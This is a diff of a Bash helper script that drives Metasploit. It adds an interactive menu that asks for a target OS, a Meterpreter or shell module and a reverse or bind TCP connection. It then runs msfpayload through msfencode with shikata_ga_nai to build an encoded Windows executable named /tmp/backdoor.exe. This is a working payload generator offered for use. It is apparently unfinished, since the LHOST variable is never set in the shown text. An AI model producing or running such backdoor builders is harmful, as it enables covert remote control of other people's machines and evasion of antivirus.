@@ -22,6 +22,15 @@ ver="0.1"
 
 ### Functions ###
 
+check_privilege(){
+	if [ `id | awk -F "=" {'print $2'} | awk -F "(" {'print $1'}` == "0" ]; then
+		echo "Good.. You have root permission.."
+	else
+		echo "Damn.. Give me root permission!!"
+		exit 0
+	fi
+}
+
 check_dependencies(){
 	echo "Checking metasploit"
 	if [ `dpkg -l | grep framework3 | awk {'print $1'}` == "ii" ]; then
@@ -33,67 +42,68 @@ check_dependencies(){
 	fi
 }
 
-check_privilege(){
-	if [ `id | awk -F "=" {'print $2'} | awk -F "(" {'print $1'}` == "0" ]; then
-		echo "Good.. You have root permission.."
-	else
-		echo "Damn.. Give me root permission!!"
-		exit 0
-	fi
+check_msf_path(){
+	echo "Let me find your msf binary path. This wont take a long time.."
+	sleep 1
+	echo "Your msf binary path has been found in $(which msfpayload | sed 's/msfpayload//g') directory!"
+	sleep 1
 }
 
-to_do(){
-	echo "What we do now? Choose a NUMBER!"
-	echo "1. Build a payload"
-	echo "2. Create metasploit listener"
-	echo "3. Quit"
-	echo ""
-	read number_to_do
-	if [[ $number_to_do == "1" ]]; then
-		echo "Will build a payload..."
-	elif [[ $number_to_do == "2" ]]; then
-		echo "Will create metasploit listener..."
-	elif [[ $number_to_do == "3" ]]; then
-		echo "Exiting..."
-		exit 0
-	else
-		echo "Please choose a valid NUMBER!!!"
-	fi
-}
+choose_payload(){
+	echo "1. Windows"
+	echo "2. Linux"
+	echo "3. MacOS"
+	echo "4. PHP"
+	echo -ne "Choose your target (1-4) : "
+	read os_target
+	if [[ $os_target == "1" ]]; then
+		echo "Windows has been selected as target. Proceed to next step"
+		os=windows
+		sleep 1; clear
+		echo "1. Meterpreter aka metasploit interpreter"
+		echo "2. Shell aka Windows Command Prompt"
+		echo "3. VNC Inject aka Remote Desktop"
+		echo "Choose your module (1-3) : "
+		read module_target
+		if [[ $module_target == "1" ]]; then
+			echo "Meterpreter has been selected as your module. Proceed to next step"
+			module=meterpreter
+			sleep 1; clear
+			echo "1. Reverse TCP aka back connect"
+			echo "2. Bind TCP aka backdoor port"
+			echo -ne "Choose your connection method (1-2) : "
+			read connection_method_target
+			if [[ $connection_method_target == "1" ]]; then
+				echo "Reverse connection has been selected as your connection method. Proceed to next step"
+				connection_method=reverse_tcp
+				sleep 1; clear
+				echo "1. Edit port listener"
+				echo "2. Proceed to build my payload"
+				echo -ne "Choose, what sould we do now (1-2) : "
+				read option
+				if [[ $option == "1" ]]; then
+					echo "Editing port listener.."
+					sleep 1
+					echo -ne "Type where should our payload will listen to : "
+					read port
+					echo "Port $port has been configured. Proceed to build our payload..."
+					echo "You payload is $os/$module/$connection_method/. Gonna make this payload"
+					echo -ne "Wait. Do you want to include msfencode in this build? (Y/N)"
+					read include_msfencode
+					if [[ $include_msfencode == "Y" || $include_msfencode == "y" ]]; then
+						echo "Gonna include x86/shikata_ga_nai in this payload..."
+						echo "Building payload.. This may take some minutes.. Even hours!! LoL, just kidding..."
+						echo "Now launching msfpayload and msfencode!"
+						echo "Reading perimeter..."
+						sleep 1
+						msfpayload $os/$module/$connection_method LPORT=$port LHOST=$lhost R | msfencode -e x86/shikata_ga_nai -c 8 -t exe -o /tmp/backdoor.exe
+					fi
+				fi
+			fi
 
-configure(){
-	echo "Let's take a few minutes to configure this script, so you won't get any error..."
-	echo "Configure metasploit path..."
-	echo "Where is your metasploit path?"
-	echo "1. I don't know?"
-	echo "2. /opt/metasploit/app"
-	echo "3. /opt/metasploit/msf3"
-	read number_metasploit_path
-	if [[ $number_metasploit_path == "1" ]]; then
-		echo "WTF man? Okay, no problem. I can do it for you..."
-		echo "First.. Let's find msfconsole"
-		sleep 1
-		echo "There! Your msfconsole is found in `which msfconsole`"
-		echo "Let's see this path..."
-		sleep 1
-		file `which msfconsole`
-		echo "There! Your metasploit path is found in`ls -l $(which msfconsole) | awk -F "->" {'print $2'}`"
-		sleep 1
-		echo "Ok, I'll set this path to our Variable..."
-		metasploit_path=`ls -l $(which msfconsole) | awk -F "->" {'print $2'}`
-		echo "Done..."
-	elif [[ $number_metasploit_path == "2" ]]; then
-		echo "I will set metasploit path to /opt/metasploit/app"
-		metasploit_path=/opt/metasploit/app
-		sleep 1
-		echo "Done..."
-	elif [[ $number_metasploit_path == "3" ]]; then
-		echo "I will set metasploit path to /opt/metasploit/msf3"
-		metasploit_path=/opt/metasploit/msf3
-		echo "Done..."
-	else
-		echo "Please choose a correct number!"
+		fi
 	fi
+
 }
 
 ### End of Functions ###
